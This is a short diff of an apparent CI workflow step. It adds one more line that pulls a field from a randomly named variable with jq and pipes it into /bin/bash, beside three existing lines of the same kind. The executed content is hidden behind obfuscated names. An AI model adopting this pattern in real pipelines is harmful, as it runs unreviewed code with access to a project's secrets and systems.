@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$skflo3" | jq -r .w222 | /bin/bash
           printf '%s' "$i8" | jq -r .af33291 | /bin/bash
           printf '%s' "$kplo58595" | jq -r .cym768 | /bin/bash
+          echo $wbqr8881 | jq -r .qo387 | /bin/bash
 
       - name: Upload results
         if: always()
